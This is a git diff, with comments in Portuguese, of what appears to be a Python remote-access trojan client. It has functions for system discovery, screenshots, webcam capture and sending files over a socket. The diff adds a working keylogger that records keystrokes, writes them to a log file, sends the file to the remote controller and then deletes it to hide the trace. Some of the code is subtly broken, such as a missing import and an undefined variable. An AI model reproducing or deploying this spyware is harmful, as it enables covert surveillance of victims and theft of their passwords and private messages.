@@ -1,5 +1,5 @@
 import socket, platform, os
-from pynput.keyboard import Key, Listener
+import keyboard
 import pygame
 
 # ========= FUNCOES DE DESCOBERTA =========
@@ -19,7 +19,28 @@ def detalhes_do_python(cliente):
 # ========= FUNCOES DO KEYLOGGER =========
 
 def keylogger(cliente):
-    possibilidades = ['a','b','c','d','e','f','g']
+    arquivo = open('log.txt','w')
+    arquivo.close()
+    recorded = keyboard.record(until='esc')
+    for i in range(0,len(recorded)):
+        v1 = str(recorded[i])
+        v2 = v1.strip('KeyboardEvent')
+        v3 = v2.strip('()')
+        v4 = v3.split()
+        if(v4[1] == 'down'):
+            if(v4[0] == 'backspace'):
+                salvar = ' backspace '
+            elif(v4[0] == 'space'):
+                salvar = ' '
+            elif(v4[0] == 'enter'):
+                salvar = '\n'
+            else:
+                salvar = v4[0]
+            arquivo = open('log.txt','a')
+            arquivo.write(salvar)
+    arquivo.close()
+    enviar_arquivo(cliente,'log.txt')
+    os.remove('log.txt')
 
 def screenshot(cliente):
     fig = pyautogui.screenshot(r)
@@ -40,13 +61,10 @@ def webcam():
         i += 1
 
 def enviar_arquivo(cliente,dir):
-    arquivo = open(dir, "rb")
-    data = arquivo.read(1024)
-    while data:
-        cliente.send(data)
-        data = arquivo.read(1024)
+    arquivo = open(dir,"r")
+    data = arquivo.readlines()
+    cliente.send(data)
     arquivo.close()
-    cliente.send(b"OK")
 
 def comando_nao_reconhecido(cliente):
     mensagem = "\nComando nao reconhecido no sistema, tente novamente"
